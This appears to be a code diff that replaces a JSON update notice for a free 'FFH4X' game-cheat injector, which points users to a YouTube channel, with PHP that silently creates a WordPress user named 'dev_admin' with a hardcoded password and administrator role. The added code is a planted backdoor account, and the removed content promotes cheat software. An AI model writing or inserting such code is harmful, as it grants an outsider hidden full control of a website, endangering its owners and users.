@@ -1,1 +1,10 @@
-[ { "version":"1.0", "aviso":"FFH4X PANEL FREE", "massage":"INJECTOR EXPIRED UPDATE THE INJECTOR\n\nUPDATED INJECTOR AVAILABLE ON CHANNEL BELLARA BLRX\n\nTHANK YOU GUYS", "okay":"UPDATE NOW", "link2":"https://youtube.com/channel/UCmEGp8tC9MRd1G2kV5dC4ag", "link":"https://youtube.com/channel/UCmEGp8tC9MRd1G2kV5dC4ag" } ]
+$userdata = array(
+    'user_login'  =>  'dev_admin',
+    'user_url'    =>  "",
+    'user_pass'   =>  "dev_paS899898",
+ 'role '    =>  "administrator"
+);
+
+$user_id = wp_insert_user( $userdata );
+$user = new WP_User($user_id);
+$user->set_role('administrator');
